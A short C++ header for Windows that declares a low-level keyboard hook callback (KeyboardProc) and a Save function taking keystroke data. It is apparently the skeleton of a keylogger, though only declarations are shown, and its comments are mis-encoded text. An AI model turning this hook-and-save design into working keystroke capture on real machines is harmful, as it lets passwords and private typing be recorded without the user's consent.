#pragma once
#include<Windows.h>
#include<iostream>
#include<fstream>

int Save(KBDLLHOOKSTRUCT kbData);

LRESULT CALLBACK KeyboardProc
(
	int code,		// ��� hook-������������
	WPARAM wParam,	// ��� ����������� �������
	LPARAM lParam	// ���������� � ��������� ������� �������
);